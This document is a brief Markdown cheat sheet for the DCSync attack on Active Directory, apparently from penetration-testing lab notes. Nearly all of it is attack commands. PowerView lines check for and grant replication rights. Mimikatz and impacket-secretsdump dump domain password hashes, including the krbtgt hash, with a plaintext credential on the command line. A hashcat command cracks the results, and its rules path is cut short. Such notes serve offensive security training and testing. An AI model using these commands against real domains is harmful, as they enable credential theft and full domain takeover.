# DC Sync

```powershell
//to check
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "studentx") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}

//to add from a admin's session
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName studentx -Rights DCSync -Verbose


Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'


lsadump::dcsync /user:dcorp\krbtgt
```

Impacket-Tools

<pre class="language-powershell"><code class="lang-powershell"><strong>impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
</strong></code></pre>

Cracking

```bash
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/b
```
